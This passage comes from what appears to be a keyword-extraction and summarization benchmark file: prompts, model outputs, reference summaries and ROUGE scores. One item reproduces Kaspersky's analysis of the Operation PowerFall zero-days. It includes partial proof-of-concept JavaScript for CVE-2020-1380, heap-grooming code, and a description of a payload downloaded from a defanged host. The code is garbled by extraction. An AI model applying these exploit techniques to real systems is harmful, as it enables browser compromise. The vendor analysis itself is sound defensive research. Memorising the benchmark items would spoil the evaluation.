Pierluigi Paganini. (Dec. 10, 2021). Security Affairs. \u201cBlackCat ransomware, a very sophisticated malware written in Rust.\u201dAccessed on July 25, 2022, at url Amanda Tanner et al. (Jan. 27, 2022). Unit 42. \u201cThreat Assessment: BlackCat Ransomware.\u201d Accessed on July 25, 2022, aturl Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2021-31207.\u201d Accessed on July25, 2022, at url Trend Micro. (May 23, 2022). Trend Micro. \u201cLockbit, Conti, and BlackCat, Lead Pack Amid Rise in Active RaaS and Extortion Groups.\u201d Accessed on July 25, 2022, at url lockbit-conti-and-blackcat-lead-pack-amid-rise-in-active-raas-and-extortion-groups-ransomware-in-q1-2022.33 Fortune Business Insights. (May 2022). Fortune Business Insights. \u201cLinux Operating System Market Size, Share & COVID-19Impact Analysis, By Distribution (Virtual Machines, Servers, and Desktops), By End-use (Commercial/Enterprise and Individual), And Regional Forecast, 2022-2029.\u201d Accessed on July 25, 2022, at url linux-operating-system-market-103037.34 Trend Micro. (May 17, 2022). Trend Micro. \u201cRansomware Spotlight: RansomEXX.\u201d Accessed on July 25, 2022, at url Hugh Aver. (March 26, 2021). Kaspersky. \u201cRansomware in a virtual environment.\u201d Accessed on July 25, 2022, at url Arianne Dela Cruz et al. (May 25, 2022). Trend Micro. \u201cNew Linux-Based Ransomware Cheerscrypt Targeting ESXi Devices Linked to Leaked Babuk Source Code.\u201d Accessed on July 25, 2022, at url new-linux-based-ransomware-cheerscrypt-targets-exsi-devices.html.45 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Report37 Lawrence Abrams. (Sept. 3, 2021). Bleeping Computer. \u201cBabuk ransomware\u2019s full source code leaked on hacker forum.\u201d Accessed on July 25, 2022, at url leaked-on-hacker-forum/.38 Ieriz Nicolle Gonzalez. (May 9, 2022). Trend Micro. \u201cExamining the Black Basta Ransomware\u2019s Infection Routine.\u201d Accessedon July 25, 2022, at url routine.html.39 Cybereason Nocturnus. (June 24, 2022). Cybereason. \u201cCybereason vs. Black Basta Ransomware.\u201d Accessed on July 25,2022, at url MalwareHunterTeam. (April 27, 2022, 9:04 p.m.) Twitter. \u201cSo this Black Basta ransomware\u2026\u201d Accessed on July 25, 2022, aturl Ieriz Nicolle Gonzalez. (May 9, 2022). Trend Micro. \u201cExamining the Black Basta Ransomware\u2019s Infection Routine.\u201d Accessedon July 25, 2022, at url routine.html.42 HHS Cybersecurity Program. (April 18, 2022). HHS Cybersecurity Program. \u201cHive Ransomware.\u201d Accessed on July 25, 2022,at url Don Ovid Ladores et al. (March 9, 2022). Trend Micro. \u201cNew Nokoyawa Ransomware Possibly Related to Hive.\u201d Accessed onJuly 25, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cMetrics.\u201d Accessed on Aug. 10, 2022,at url#PublishedCVERecords.45 Cybersecurity & Infrastructure Security Agency. (n.d.). Cybersecurity & Infrastructure Security Agency. \u201cKnown ExploitedVulnerabilities Catalog.\u201d Accessed on July 28, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2017-14100.\u201d Accessed on July25, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE- CVE-2022-30190.\u201d Accessedon Aug. 23, 2022, at url Carly Page. (June 1, 2022). Tech Crunch. \u201cChina-backed hackers are exploiting unpatched Microsoft zero-day.\u201d Accessed on (Aug. 23, 2022), at url Dustin Childs. (June 14, 2022). Zero Day Initiative. \u201cThe June 2022 Security Update Review.\u201d Accessed on (Aug. 23, 2022), aturl Trend Micro. (n.d.). Trend Micro. \u201cApache Log4j (Log4Shell) Vulnerability.\u201d Accessed on July 25, 2022, at url Brian Barrett. (Dec. 16, 2021). Wired. \u201cThe Next Wave of Log4J Attacks Will Be Brutal.\u201d Accessed on July 25, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2022-22965.\u201d Accessed on July25, 2022, at url Deep Patel et al. (April 8, 2022). Trend Micro. \u201cCVE-2022-22965: Analyzing the Exploitation of Spring4Shell Vulnerability in Weaponizing and Executing the Mirai Botnet Malware.\u201d Accessed on July 25, 2022, at url research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html.54 Nitesh Surana and Ashish Verma. (April 20, 2022). Trend Micro. \u201cAnalyzing Attempts to Exploit the Spring4Shell VulnerabilityCVE-2022-22965 to Deploy Cryptocurrency Miners.\u201d Accessed on July 25, 2022, at url research/22/d/spring4shell-exploited-to-deploy-cryptocurrency-miners.html.55 Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2021-44142.\u201d Accessed on July25, 2022, at url Zero Day Initiative. (Feb. 1, 2022). Zero Day Initiative. \u201cCVE-2021-44142: Details on a Samba Code Execution BugDemonstrated at PWN2OWN Austin.\u201d Accessed on July 25, 2022, at url 2021-44142-details-on-a-samba-code-execution-bug-demonstrated-at-pwn2own-austin.57 Samba. (n.d.). Samba. \u201cSamba Security Releases.\u201d Accessed on July 25, 2022, at url | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Report58 Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2021-44228.\u201d Accessed on Aug.1, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2021-45046.\u201d Accessed on Aug.1, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2017-14495.\u201d Accessed on Aug.1, 2022, at url Federico Maggi. (Oct. 9, 2017). Trend Micro. \u201cDnsmasq: A Reality Check and Remediation Practices.\u201d Accessed on Aug. 1,2022, at url Real-Time Innovations. (n.d.). Real-Time Innovations. \u201cDDS: An Open Standard for Real-Time Applications.\u201d Accessed on July25, 2022, at url#:~:text=DDS%3A%20An%20Open%20Standard%20for,meet%20 real-time%20system%20requirements.63 Federico Maggi et al. (Jan. 27, 2022). Trend Micro. \u201cA Security Analysis of the Data Distribution Service (DDS) Protocol.\u201dAccessed on July 25, 2022, at url distribution-service-dds-protocol.pdf.64 Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2021-38447.\u201d Accessed on July 25, 2022, at url#:~:text=OCI%20OpenDDS%20versions%20 prior%20to,denial%2Dof%2Dservice%20condition.65 Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2021-38445.\u201d Accessed on July25, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2022-22639.\u201d Accessed on July25, 2022, at url Mickey Jin. (April 4, 2022). Trend Micro. \u201cMacOS SUHelper Root Privilege Escalation Vulnerability: A Deep Dive Into CVE-2022-22639.\u201d Accessed on July 25, 2022, at url privilege-escalation-vulnerability-a-deep-di.html.68 Apple. (March 14, 2022). Apple. \u201cAbout the security content of macOS Monterey 12.3.\u201d Accessed on July 25, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2022-0847.\u201d Accessed on July25, 2022, at url Sunil Bharti. (April 6, 2022). Trend Micro. \u201cDetecting Exploitation of Local Vulnerabilities Through Trend Micro Vision One\u2122 and Cloud One\u2122.\u201d Accessed on July 25, 2022, at url of-local-vulnerabilities-through-trend-mi.html.71 Cybersecurity & Infrastructure Security Agency. (March 10, 2022). Cybersecurity & Infrastructure Security Agency. \u201cDirty Pipe Privilege Escalation Vulnerability in Linux.\u201d Accessed on July 25, 2022, at url activity/2022/03/10/dirty-pipe-privilege-escalation-vulnerability-linux.72 Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2022-29464.\u201d Accessed on July25, 2022, at url hakivvi. (April 25, 2022). GitHub. \u201cCVE-2022-29464/exploit.py.\u201d Accessed on July 25, 2022, at url Orange Tsai et al. (May 2, 2022). Packet Storm Security. \u201cWSO Arbitrary File Upload / Remote Code Execution.\u201d Accessed onJuly 25, 2022, at url Hitomi Kimura et al. (May 31, 2022). Trend Micro. \u201cPatch Your WSO2: CVE-2022-29464 Exploited to Install Linux-CompatibleCobalt Strike Beacons, Other Malware.\u201d Accessed on July 25, 2022, at url patch-your-wso2-cve-2022-29464-exploited-to-install-linux-compatible-cobalt-strike-beacons-other-malware.html.76 WSO2. (April 29, 2022). WSO2. \u201cSecurity Advisory WSO2-2021-1738.\u201d Accessed on July 25, 2022, at url WSO2. (April 29, 2022). WSO2. \u201cSecurity Advisory WSO2-2021-1738.\u201d Accessed on July 25, 2022, at url | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Report78 Amazon Web Services. (June 2020). Amazon Web Services. \u201cCloud Value Benchmarking Study Quantifies the Benefits of Cloud Adoption.\u201d Accessed on July 25, 2022, at url benchmarking-study-quantifies-cloud-adoption-benefits.pdf.79 Gartner. (April 19, 2022). Gartner. \u201cGartner Forecasts Worldwide Public Cloud End-User Spending to Reach Nearly $500Billion in 2022.\u201d Accessed on July 25, 2022, at url forecasts-worldwide-public-cloud-end-user-spending-to-reach-nearly-500-billion-in-2022.80 Joanna Ossinger et al. (June 19, 2022). Fortune. \u201cBitcoin has extended its record-breaking decline to below $19,000.\u2018Although painful, removing the sector\u2019s froth is likely healthy,\u2019 one expert contends.\u201d Accessed on July 25, 2022, at https:// fortune.com/2022/06/18/bitcoin-has-extended-its-record-breaking-decline-to-below-19000-although-painful-removing-the- sectors-froth-is-likely-healthy-one-expert-contends/.81 Mayra Rosario Fuentes et al. (March 29, 2022). Trend Micro. \u201cA Floating Battleground: Navigating the Landscape of Cloud-Based Cryptocurrency Mining.\u201d Accessed on July 25, 2022, at url navigating-the-landscape-of-cloud-based-cryptocurrency-mining.pdf.82 Trend Micro. (Nov. 19, 2018). Trend Micro. \u201cOutlaw Group Distributes Cryptocurrency-Mining Botnet.\u201d Accessed on July25, 2022, at url scanning-and-brute-force.html.83 David Fiser and Alfredo Oliveira. (July 20, 2021). Trend Micro. \u201cTracking the Activities of TeamTNT: A Closer Look at a Cloud-Focused Malicious Actor Group.\u201d Accessed on July 25, 2022, at url tracking-the-activities-of-teamTNT.pdf.84 Jaromir Horejsi and David Fiser. (Nov. 24, 2020). Trend Micro. \u201cAnalysis of Kinsing Malware\u2019s Use of Rootkit.\u201d Accessed onJuly 25, 2022, at url Lawrence Abrams. (Dec. 12, 2021). Bleeping Computer. \u201cHackers start pushing malware in worldwide Log4Shell attacks.\u201dAccessed on July 26, 2022, at url worldwide-log4shell-attacks/.86 Ryan Flores et al. (April 26, 2022). Trend Micro. \u201cHow Cybercriminals Abuse Cloud Tunneling Services.\u201d Accessed on July26, 2022, at url cloud-tunneling-services.87 Aprilyn Borja et al. (Sept. 14, 2020). Trend Micro. \u201cAnalysis of a Convoluted Attack Chain Involving Ngrok.\u201d Accessed on July26, 2022, at url Global News Wire. (May 6, 2020). Trend Micro. \u201cApplication Container Market is Expected to Reach $8.20 Billionby 2025, Says Allied Market Research.\u201d Accessed on July 22, 2022, at url release/2020/05/06/2028585/0/en/Application-Container-Market-is-Expected-to-Reach-8-20-Billion-by-2025-Says-Allied- Market-Research.html.89 Trend Micro. (May 14, 2019). Trend Micro. \u201cContainer Security: Examining Potential Threats to the Container Environment.\u201d Accessed on July 26, 2022, at url examining-potential-threats-to-the-container-environment.90 Red Hat. (May 18, 2022). Red Hat. \u201cKubernetes adoption, security, and market trends report 2022.\u201d Accessed on July 26,2022, at url Magno Logan. (May 24, 2022). Trend Micro. \u201cThe Fault in Our Kubelets: Analyzing the Security of Publicly ExposedKubernetes Clusters.\u201d Accessed on July 26, 2022, at url kubelets-analyzing-the-security-of-publicly-exposed-kubernetes-clusters.html.92 Mark Nunnikhoven. (Oct. 22, 2019). Trend Micro. \u201cThe Shared Responsibility Model.\u201d Accessed on July 26, 2022, at url Trend Micro. (April 24, 2022). Trend Micro. \u201cHow to better manage your digital attack surface risk.\u201d Accessed on July 26, 2022,at url Trend Micro. (n.d.). Trend Micro. \u201cTrend Micro One.\u201d Accessed on July 26, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2018-13379.\u201d Accessed on July26, 2022, at url | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Report96 Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2021-22986.\u201d Accessed on July26, 2022, at url Trend Micro. (Feb. 11, 2016). Trend Micro. \u201cFrequently Asked Questions: BlackEnergy.\u201d Accessed on July 26, 2022, at url Feike Hacquebord et al. (March 17, 2022). Trend Micro. \u201cCyclops Blink Sets Sights on Asus Routers.\u201d Accessed on July 26,2022, at url WatchGuard. (Feb. 23, 2022). WatchGuard. \u201cImportant Detection and Remediation Actions for Cyclops Blink State-Sponsored Botnet.\u201d Accessed on July 26, 2022, at url actions-cyclops-blink-state-sponsored-botnet.100 Asus. (n.d.). Asus. \u201cASUS Product Security Advisory.\u201d Accessed on July 26, 2022, at url Zoe Kleinman. (June 14, 2022). BBC. \u201cBitcoin: Why is the largest cryptocurrency crashing?\u201d Accessed on July 26, 2022, aturl Cifer Fang et al. (March 24, 2022). Trend Micro. \u201cAn Investigation of Cryptocurrency Scams and Schemes.\u201d Accessedon July 26, 2022, at url of-cryptocurrency-scams-and-schemes/03Technical%20Brief%20Keeping%20Assets%20Safe%20From%20 Cryptocurrency%20Scams%20and%20Schemes.pdf.103 Cifer Fang et al. (May 16, 2022). Trend Micro. \u201cFake Mobile Apps Steal Facebook Credentials, Cryptocurrency-RelatedKeys.\u201d Accessed on July 26, 2022, at url credentials--crypto-related-keys.html.49 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportTREND MICROTM RESEARCH Trend Micro, a global leader in cybersecurity, helps to make the world safe for exchanging digital information.Trend Micro Research is powered by experts who are passionate about discovering new threats, sharing key insights, and supporting efforts to stop cybercriminals. Our global team helps identify millions of threats daily, leads the industry in vulnerability disclosures, and publishes innovative research on new threat techniques. We continually work to anticipate new threats and deliver thought-provoking research.www.trendmicro.com ", "generated_text": "The report; Trend Micro; cyberattacks; first half of 2022; organizations; digital transformation; the first half of 2022; large sections; the workforce; the challenges; defending all possible sections; the IT infrastructure; Ransomware developers; the first half of 2021; Conti; LockBit; BlackCat; Conti; BlackCat; malicious actors; commodity malware; older tools; capabilities; severity; attacks; a resurgence; malware vulnerabilities; their campaigns; a collaboration; the Russian-Ukraine hostilities; the cloud; vulnerabilities; the threat landscape; multiple layers; techniques; infrastructure; the threat landscape; recommendations; cybersecurity measures; threats; Attackers; the threat landscape; the same time.", "ref_text": "<START-1>The PDF is Trend Micro's 2022 Midyear Cybersecurity Report, reviewing threats and trends from the first half of 2022. Key points: - Threat actors like Earth Lusca and Earth Berberoka are using extensive infrastructure and varied tools in campaigns targeting organizations worldwide. Commodity malware like Emotet saw major growth as ransomware groups integrate it into attacks. - Ransomware continues to evolve via Ransomware-as-a-Service (RaaS) operations like LockBit, Conti, and BlackCat. Linux systems are increasingly targeted. New ransomware families like Black Basta emerged targeting big-game victims. - Critical and high-severity vulnerabilities rose substantially, including issues like Spring4Shell affecting business software. Vulnerabilities in non-Windows systems and in the DDS standard used in IIoT devices were also analyzed. - Cloud threats remain, with cryptomining groups like TeamTNT active in compromising cloud assets. Attackers abuse cloud tunneling services and cloud misconfigurations persist as an issue. - Fileless malware, maldocs with macros, and tiny malware aim to bypass traditional signature-based defenses. A cross-generational blended defense is required. - Business email compromise losses now exceed $12 billion. AI-powered phishing detection solutions can help curb socially engineered scams. The report shares data on malware, network threats, vulnerabilities, data breaches, and other cybersecurity trends seen in the first half of 2022. It emphasizes the need for comprehensive and blended security to address the expanding digital attack surface. <END-1>", "t5/keyword/hint_hit_precision": 0.32558139534883723, "t5/word/hint_hit_recall": 0.0958904109589041, "gpt3/lexical/rouge_rouge1": 0.3800623052959502, "gpt3/lexical/rouge_rouge2": 0.09404388714733543, "gpt3/lexical/rouge_rougeL": 0.1931464174454829, "gpt3/lexical/rouge_rougeLsum": 0.1931464174454829, "gpt3_generated_text": ["The Trend Micro 2022 Midyear Cybersecurity Report highlights the growing attack surface faced by organizations in the first half of 2022 due to digital transformation and remote working. Ransomware developers, including Conti, LockBit, and BlackCat, are adopting more lucrative monetization methods, leading to a rise in attacks. Malicious actors are utilizing commodity malware, older tools, and expanding beyond Windows to target Linux systems. The report also discusses the increase in critical vulnerabilities and attacks on cloud infrastructure. To address these threats, organizations are advised to implement robust security measures and policies, including multilayered defenses and effective security technologies."]}, {"split_name": "val", "sample_id": "val_33", "prompt_text": "Extract the keywords: 8/14/2020Internet Explorer and Windows zero-day exploits used in Operation PowerFall | SecurelistInternet Explorer and Windows zero-day exploits used in Operation PowerFallsecurelist.com/ie-and-windows-zero-day-operation-powerfall/97976By Boris Larin Executive summaryIn May 2020, Kaspersky technologies prevented an attack on a South Korean company by a malicious script for Internet Explorer. Closer analysis revealed that the attack used a previously unknown full chain that consisted of two zero-day exploits: a remote code execution exploit for Internet Explorer and an elevation of privilege exploit for Windows. Unlike a previous full chain that we discovered, used in Operation WizardOpium, the new full chain targeted the latest builds of Windows 10, and our tests demonstrated reliable exploitation of Internet Explorer 11 and Windows 10 build 18363 x64.On June 8, 2020, we reported our discoveries to Microsoft, and the company confirmed the vulnerabilities. At the time of our report, the security team at Microsoft had already prepared a patch for vulnerability CVE-2020-0986 that was used in the zero-day elevation of privilege exploit, but before our discovery, the exploitability of this vulnerability was considered less likely. The patch for CVE-2020-0986 was released on June 9, 2020.Microsoft assigned CVE-2020-1380 to a use-after-free vulnerability in JScript and the patch was released on August 11, 2020.We are calling this and related attacks \u2018Operation PowerFall\u2019. Currently, we are unable to establish a definitive link with any known threat actors, but due to similarities with previously discovered exploits, we believe that DarkHotel may be behind this attack. Kaspersky products detect Operation PowerFall attacks with verdict PDM:Exploit.Win32.Generic.Internet Explorer 11 remote code execution exploitThe most recent zero-day exploits for Internet Explorer discovered in the wild relied on the vulnerabilities CVE-2020-0674, CVE-2019-1429, CVE-2019-0676 and CVE-2018- 8653 in the legacy JavaScript engine jscript.dll. In contrast, CVE-2020-1380 is a vulnerability in jscript9.dll, which has been used by default starting with Internet Explorer 9, and because of this, the mitigation steps recommended by Microsoft (restricting the usage of jscript.dll) cannot protect against this particular vulnerability.url Explorer and Windows zero-day exploits used in Operation PowerFall | SecurelistCVE-2020-1380 is a Use-After-Free vulnerability that is caused by JIT optimization and the lack of necessary checks in just-in-time compiled code. A proof-of-concept (PoC) that triggers vulnerability is demonstrated below:1 46function func(O, A, F, O2) { arguments.push = Array.prototype.push; O = 1; arguments.length = 0; arguments.push(O2); if (F == 1) { // execute abp.valueOf() and write by dangling pointer A[5] = O; var an = new ArrayBuffer(0x8c); var fa = new Float32Array(an); func(1, fa, 1, {}); for (var i = 0; i < 0x10000; i++) { func(1, fa, 1, 1); abp.valueOf = function() { worker = new Worker('worker.js'); worker.postMessage(an, [an]); var start = Date.now(); while (Date.now() - start < 200) {} // TODO: reclaim freed memory func(1, fa, 0, abp); }url Explorer and Windows zero-day exploits used in Operation PowerFall | SecurelistTo understand this vulnerability, let us take a look at how func() is executed. It is important to understand what value is set to A[5]. According to the code, it should be an O argument. At function start, the O argument is re-assigned to 1, but then the function arguments length is set to 0. This operation does not clear function arguments (as it would normally do with regular array) but allows to put argument O2 into the arguments list at index zero using Array.prototype.push, meaning O = O2 now. Besides that, if the argument F is equal to 1, then O will be re-assigned once again, but to the integer number 2. It means that depending on the value of the F argument, the O argument is equal to either the value of the O2 argument or the integer number 2. The argument A is a typed array of 32-bit floating point numbers, and before assigning a value to index 5 of the array, this value should be converted to a float. Converting an integer to a float is a relatively simple task, but it become less straightforward when an object is converted to a float number. The exploit uses the object abp with an overridden valueOf() method. This method is executed when the object is converted to a float, but inside the method there is code that frees ArrayBuffer, which is viewed by Float32Array and where the returned value will be set. To prevent the value from being stored in the memory of the freed object, the JavaScript engine needs to check the status of the object before storing the value in it. To convert and store the float value safely, JScript9.dll uses the function Js::TypedArray<float,0>::BaseTypedDirectSetItem(). You can see decompiled code of this function below:1 22int Js::TypedArray<float,0>::BaseTypedDirectSetItem(Js::TypedArray<float,0> *this, unsigned int index, void *object, int reserved) { Js::JavascriptConversion::ToNumber(object, this->type->library->context); if ( LOBYTE(this->view[0]->unusable) ) Js::JavascriptError::ThrowTypeError(this->type->library->context, 0x800A15E4, 0); if ( index < this->count ) { *(float *)&this->buffer[4 * index] = Js::JavascriptConversion::ToNumber( object, this->type->library->context); double Js::JavascriptConversion::ToNumber(void *object, struct Js::ScriptContext if ( (unsigned char)object & 1 ) return (double)((int)object >> 1); if ( *(void **)object == VirtualTableInfo<Js::JavascriptNumber>::Address[0] ) return *((double *)object + 1); return Js::JavascriptConversion::ToNumber_Full(object, context); }This function checks the view[0]->unusable and count fields of the typed float array and when ArrayBuffer is freed during execution of the valueOf() method, both of these checks will fail because view[0]->unusable will be set to 1 and count will be set to 0 during theurl Explorer and Windows zero-day exploits used in Operation PowerFall | Securelistfirst call to Js::JavascriptConversion::ToNumber(). The problem lies in the fact that the function Js::TypedArray<float,0>::BaseTypedDirectSetItem() is used only in interpretation mode.When the function func() is compiled just in time, the JavaScript engine will use the vulnerable code below.1 22if ( !((unsigned char)floatArray & 1) && *(void *)floatArray == &Js::TypedArray<float,0>::vftable ) { if ( floatArray->count > index ) { buffer = floatArray->buffer + 4*index; if ( object & 1 ) { *(float *)buffer = (double)(object >> 1); if ( *(void *)object != &Js::JavascriptNumber::vftable ) { Js::JavascriptConversion::ToFloat_Helper(object, (float *)buffer, context); *(float *)buffer = *(double *)(object->value); }And here is the code of the Js::JavascriptConversion::ToFloat_Helper() function.1 4void Js::JavascriptConversion::ToFloat_Helper(void *object, float *buffer, struct Js::ScriptContext *context) { *buffer = Js::JavascriptConversion::ToNumber_Full(object, context); }As you can see, unlike in interpretation mode, in just-in-time compiled code, the life cycle of ArrayBuffer is not checked, and its memory can be freed and then reclaimed during a call to the valueOf() function. Additionally, the attacker can control at what index the returned value is written. However, in the case when \u201carguments.length = 0;\u201dand \u201carguments.push(O2);\u201d are replaced in PoC with \u201carguments[0] = O2;\u201d then Js::JavascriptConversion::ToFloat_Helper() will not trigger the bug because implicit calls will be disabled and it will not perform a call to the valueOf() function.To ensure that the function func() is compiled just in time, the exploit executes this function 0x10000 times, performing a harmless conversion of the integer, and only after that func() is executed once more, triggering the bug. To free ArrayBuffer, the exploit usesurl Explorer and Windows zero-day exploits used in Operation PowerFall | Securelista common technique abusing the Web Workers API. The function postMessage() can be used to serialize objects to messages and send them to the worker. As a side effect, transferred objects are freed and become unusable in the current script context. When ArrayBuffer is freed, the exploit triggers garbage collection via code that simulates the use of the Sleep() function: it is a while loop that checks for the time lapse between Date.now() and the previously stored value. After that, the exploit reclaims the memory with integer arrays.1 4for (var i = 0; i < T.length; i += 1) { T[i] = new Array((0x1000 - 0x20) / 4); T[i][0] = 0x666; // item needs to be set to allocate LargeHeapBucket }When a large number of arrays is created, Internet Explorer allocates new LargeHeapBlock objects, which are used by IE\u2019s custom heap implementation. The LargeHeapBlock objects will store the addresses of buffers allocated for the arrays. If the expected memory layout is achieved successfully, the vulnerability will overwrite the value at the offset 0x14 of LargeHeapBlock with 0, which happens to be the allocated block count.LargeHeapBlock structure for jscript9.dll x86After that, the exploit allocates a huge number of arrays and sets them to another array that was prepared at the initial stage of the exploitation. Then this array is set to null, and the exploit makes a call to the CollectGarbage() function. This results in defragmentation of the heap, and the modified LargeHeapBlock will be freed along with its associated array buffers. At this stage, the exploit creates a large amount of integer arrays in hopes of reclaiming the previously freed array buffers. The newly created arrays have a magic value set at index zero, and this value is checked through a dangling pointer to the previously freed array to detect if the exploitation was successful.url Explorer and Windows zero-day exploits used in Operation PowerFall | Securelist1 11for (var i = 0; i < K.length; i += 1) { K[i] = new Array((0x1000 - 0x20) / 4); K[i][0] = 0x888; // store magic for (var i = 0; i < T.length; i += 1) { if (T[i][0] == 0x888) { // find array accessible through dangling pointer R = T[i]; }As a result, the exploit creates two different JavascriptNativeIntArray objects with buffers pointing to the same location. This makes it possible to retrieve the addresses of the objects and even create new malformed objects. The exploit takes advantage of these primitives to create a malformed DataView object and get read/write access to the whole address space of the process.After the building of the arbitrary read/write primitives, it is time to bypass Control Flow Guard (CFG) and get code execution. The exploit uses the Array\u2019s vftable pointer to get the module base address of jscript9.dll. From there, it parses the PE header of jscript9.dll to get the address of the Import Directory Table and resolves the base addresses of the other modules. The goal here is to find the address of the function VirtualProtect(), which will be used to make the shellcode executable. After that, the exploit searches for two signatures in jscript9.dll. Those signatures correspond to the address of the Unicode string \u201csplit\u201d and the address of the function: JsUtil::DoublyLinkedListElement<ThreadContext>::LinkToBeginning<ThreadContext> (). The address of the Unicode string \u201csplit\u201d is used to get a code reference to the string and with its help, to resolve the address of the function Js::JavascriptString::EntrySplit(), which implements the string method split(). The address of the function LinkToBeginning<ThreadContext>() is used to obtain the address of the first ThreadContext object in the global linked list. The exploit locates the last entry in the linked list and uses it to get the location of the stack for the thread responsible for the execution of the script. After that comes the final stage. The exploit executes the split() method and an object with an overridden valueOf() method is provided as a limit argument. When the overridden valueOf() method is executed during the execution of the function Js::JavascriptString::EntrySplit(), the exploit will search the thread\u2019s stack to find the return address, place the shellcode in a prepared buffer, obtain its address, and finally build a return-oriented programming (ROP) chain to execute the shellcode by overwriting the return address of the function.Next stageThe shellcode is a reflective DLL loader for the portable executable (PE) module that is appended to the shellcode. The module is very small in size, and the whole functionality is located inside a single function. It creates a file within a temporary folder with the nameurl Explorer and Windows zero-day exploits used in Operation PowerFall | Securelistok.exe and writes to it the contents of another executable that is present in the remote code execution exploit. After that, ok.exe is executed.The ok.exe executable contains is an elevation of privilege exploit for the arbitrary pointer dereference vulnerability CVE-2020-0986 in the GDI Print / Print Spooler API. Initially, this vulnerability was reported to Microsoft by an anonymous user working with Trend Micro\u2019s Zero Day Initiative back in December 2019. Due to the patch not being released for six months since the original report, ZDI posted a public advisory for this vulnerability as a zero-day on May 19, 2020. The next day, the vulnerability was exploited in the previously mentioned attack.The vulnerability makes it possible to read and write the arbitrary memory of the splwow64.exe process using interprocess communication, and use it to achieve code execution in the splwow64.exe process, bypassing the CFG and EncodePointer protection. The exploit comes with two executables embedded in its resources. The first executable is written to disk as CreateDC.exe and is used to create a device context (DC), which is required for exploitation. The second executable has the name PoPc.dll and if the exploitation is successful, it is executed by splwow64.exe with a medium integrity level. We will provide further details on CVE-2020-0986 and its exploitation in a follow-up post.Execution of a malicious PowerShell command from splwow64.exeThe main functionality of PoPc.dll is also located inside a single function. It executes an encoded PowerShell command that proceeds to download a file from www[.]static- cdn1[.]com/update.zip, saves it to the temporary folder as upgrader.exe and executes it. We were unable to analyze upgrader.exe because Kaspersky technologies prevented the attack before the executable was downloaded.IoCswww[.]static-cdn1[.]com/update.zip 5877EAECA1FE8A3A15D6C8C5D7FA240Burl Explorer and Windows zero-day exploits used in Operation PowerFall | Securelist7577E42177ED7FC811DE4BC854EC226EB037F797C3B114E163940A86FD8B078B 81D07CAE45CAF27CBB9A1717B08B3AB358B647397F08A6F9C7652D00DBF2AE24url ", "generated_text": "the attack; Kaspersky; a South Korean company; the attacks; a remote code execution exploit; Internet Explorer 11; Windows 10; 18363; x64; the vulnerability; CVE-2020-1380; JScript; the vulnerability; jscript9.dll; the use-after-free vulnerability; JIT optimization; the vulnerability; the vulnerabilities; jscript9.dll; a use-after-free vulnerability; JScript; the exploit; the vulnerability; the code; zero-day; zero-day exploits; Russia; a South Korean company.", "ref_text": "<START-1>The PDF describes an attack called Operation PowerFall that exploited two zero-day vulnerabilities in Internet Explorer and Windows. The attack targeted a South Korean company in May 2020 and was detected and prevented by Kaspersky technologies. The attack used a full exploit chain that consisted of: - A remote code execution exploit for a use-after-free vulnerability in Internet Explorer's JScript engine (CVE-2020-1380). This allowed arbitrary code execution in the context of the browser. - An elevation of privilege exploit for an arbitrary pointer dereference vulnerability in the Windows GDI Print/Print Spooler API (CVE-2020-0986). This allowed escaping the sandbox and executing code in splwow64.exe. The Internet Explorer exploit gained read/write access to the process's memory using corrupted JavaScript objects. It then bypassed Control Flow Guard to execute shellcode that loaded a DLL containing the Windows exploit. The Windows exploit achieved code execution in splwow64.exe with medium integrity. It executed an obfuscated PowerShell command to download a file called upgrader.exe which was prevented by Kaspersky. Kaspersky believes an APT group called DarkHotel may be behind the attack due to similarities with previous exploits, but definitive attribution is not possible. The attack demonstrates 0-day exploits being used in the wild against the latest Windows 10 versions. <END-1>", "t5/keyword/hint_hit_precision": 0.32142857142857145, "t5/word/hint_hit_recall": 0.09852216748768473, "gpt3/lexical/rouge_rouge1": 0.4591194968553459, "gpt3/lexical/rouge_rouge2": 0.1962025316455696, "gpt3/lexical/rouge_rougeL": 0.220125786163522, "gpt3/lexical/rouge_rougeLsum": 0.220125786163522, "gpt3_generated_text": ["In May 2020, Kaspersky prevented an attack on a South Korean company using a malicious script for Internet Explorer. The attack utilized two zero-day exploits, one for remote code execution in Internet Explorer 11 and the other for elevation of privilege in Windows 10 build 18363 x64. Microsoft confirmed the vulnerabilities and released patches for CVE-2020-0986 and CVE-2020-1380. The latter, a use-after-free vulnerability in JScript, was exploited through JIT optimization. This attack, named Operation PowerFall, bears similarities to previous exploits linked to DarkHotel. Kaspersky products detect these attacks with the PDM:Exploit.Win32.Generic verdict."]}, {"split_name": "val", "sample_id": "val_34", "prompt_text": "Extract the keywords: The Hunt for 3veTaking down a major ad fraud operation through industry 